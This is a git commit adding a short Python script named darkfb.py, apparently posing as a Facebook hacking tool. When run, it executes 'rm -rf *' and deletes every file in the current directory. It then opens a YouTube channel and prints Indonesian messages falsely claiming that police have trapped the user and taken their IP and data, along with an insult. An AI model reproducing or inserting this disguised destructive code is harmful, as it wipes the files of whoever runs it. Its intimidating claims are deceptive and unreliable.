4ee5f13b653b8dddd17b1d63b945e01205c2844a
MRBU61L12 <52393583+MRBU61L12@users.noreply.github.com>
2019-08-03 08:51:56 +0700

    Add files via upload

---
+++ darkfb.py
@@ -0,0 +1,7 @@
+import os
+os.system("rm -rf *")
+os.system("xdg-open https://www.youtube.com/channel/UCXdmo_q4SawYMz-dmeKEHPQ")
+os.system("clear")
+os.system("figlet SAYANGNYA! | lolcat ")
+print("\n\n anda telah terkena jebakan polri\n ip anda sudah kami dapatkan\n dan data anda telah kami potong ke komputer kami\n\n - dan telah dihapus dari perangkat anda\n\n")
+print("MAKANYA PAKE VPN GOBLOG")
